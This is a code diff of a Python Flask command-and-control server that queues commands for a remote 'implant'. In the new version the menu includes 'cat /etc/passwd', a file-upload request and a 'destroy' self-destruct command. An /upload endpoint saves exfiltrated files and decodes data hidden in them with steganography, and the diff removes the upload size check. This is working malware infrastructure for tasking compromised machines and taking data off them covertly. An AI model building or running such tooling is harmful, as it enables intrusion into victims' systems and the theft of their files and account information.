@@ -1,19 +1,17 @@
 from flask import Flask, request, jsonify
-import json
 import os
 from queue import *
+from stegano import lsb
+
 
 app = Flask(__name__)
 
 # Predefined command menu
 command_menu = {
-    0: 'ls -lah ~/Pictures ~/Photos ~/Images 2>/dev/null', # List contents of common photo folders
-    1: 'find /home/ -type f \( -iname "*.jpg" -o -iname "*.jpeg" \) -size +1M', # Find large image files
-    2: 'find /home/ -type f \( -iname "*.raw" -o -iname "*.cr2" -o -iname "*.nef" \)', # Search for RAW image formats (professional cameras)
-    3: 'find /home/ -type d \( -iname "*wildlife*" -o -iname "*safari*" -o -iname "*animals*" \)', # Search for useful keywords
-    4: 'ls /mnt/ /media/ /run/media/ 2>/dev/null', # Check mounted external storage devices (i.e., USB drives or SD cards)
-    5: 'destroy', # Special non-Linux command that causes client to self-destruct
-    6: 'upload_path' # Special non-Linux command to request a specific file
+    0: 'ls -lah',
+    1: 'cat /etc/passwd',
+    2: 'upload',
+    3: 'destroy', # Special non-Linux command that causes client to self-destruct
 }
 
 # Queue of tasks assigned to the implant
@@ -28,7 +26,7 @@ def menu():
 @app.route('/assign/<int:cmd_index>', methods=['POST'])
 def assign_command(cmd_index):
     if 0 <= cmd_index < len(command_menu):
-        if cmd_index == 6:
+        if cmd_index == 2:
             data = request.get_json()
             path = data.get('path')
             if not path:
@@ -43,7 +41,7 @@ def assign_command(cmd_index):
 
 
 # Implant periodically polls this endpoint to get a task
-@app.route('/task', methods=['POST'])
+@app.route('/task', methods=['GET'])
 def get_task():
     if not tasks.empty():
         task = tasks.get()
@@ -51,10 +49,12 @@ def get_task():
     return jsonify({"task": "sleep 10"})
 
 
+# Implant invokes this endpoint to send exfiltrated data back to the server
 # Implant invokes this endpoint to send images back to the server
 @app.route('/upload', methods=['POST'])
 def receive_data():
     file = request.files.get('file')
+    print(request.files)
     if file:
         filename = file.filename
         save_path = os.path.join('exfiltrated_data', filename)
@@ -62,17 +62,19 @@ def receive_data():
         # Make sure directory exists
         os.makedirs('exfiltrated_data', exist_ok=True)
 
-        # Check for file size (e.g., 10MB limit)
-        if len(file.read()) > 10 * 1024 * 1024:  # 10MB limit
-            return jsonify({"error": "File size exceeds 10MB"}), 400
-
         # Save the uploaded file
         file.save(save_path)
-
         print(f"Received and saved file: {filename}")
-        return jsonify({"status": "File received"})
+        
+        deobfuscated_data = lsb.reveal(save_path)
+        print(deobfuscated_data)
+        
+        return jsonify({"Success": "Yay"}), 200
+        
     else:
         return jsonify({"error": "No file provided"}), 400
+    
+    
 
 
 if __name__ == '__main__':
